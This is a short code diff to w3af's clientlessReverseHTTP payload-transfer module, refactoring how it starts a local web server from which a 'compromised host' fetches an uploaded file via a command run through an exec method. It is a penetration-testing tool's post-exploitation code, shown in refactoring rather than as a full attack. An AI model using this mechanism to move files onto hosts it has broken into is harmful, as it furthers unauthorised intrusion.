@@ -25,7 +25,7 @@ from core.controllers.w3afException import *
 from core.data.fuzzer.fuzzer import *
 from core.controllers.payloadTransfer.basePayloadTransfer import basePayloadTransfer as basePayloadTransfer
 
-from core.controllers.daemons.webserver import webserver
+import core.controllers.daemons.webserver as webserver
 from core.controllers.misc.temp_dir import get_temp_dir
 from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile
 
@@ -92,17 +92,18 @@ class clientlessReverseHTTP( basePayloadTransfer ):
         f.write( strObject )
         f.close()
         
-        # Start a web server on the inbound port and create the file that will be fetched by the compromised host
-        _wS = webserver( cf.cf.getData( 'localAddress' ), self._inboundPort , get_temp_dir() + os.path.sep)
-        _wS.start2()
-        time.sleep(0.2) # wait for webserver thread to start
+        # Start a web server on the inbound port and create the file that 
+        # will be fetched by the compromised host
+        webserver.start_webserver(cf.cf.getData('localAddress'),
+                                  self._inboundPort,
+                                  get_temp_dir() + os.path.sep)
         
-        commandToRun = commandTemplates[ self._command ] % ( cf.cf.getData( 'localAddress' ) , self._inboundPort, filename, destination )
-        self._exec_method( commandToRun )
-        
-        _wS.stop()
-        os.remove( filePath )
-        time.sleep(0.5) # wait for webserver thread to die
+        commandToRun = commandTemplates[self._command] % \
+                            (cf.cf.getData('localAddress'), self._inboundPort,
+                             filename, destination)
+        self._exec_method(commandToRun)
+
+        os.remove(filePath)
         
         return self.verify_upload( strObject, destination )
         
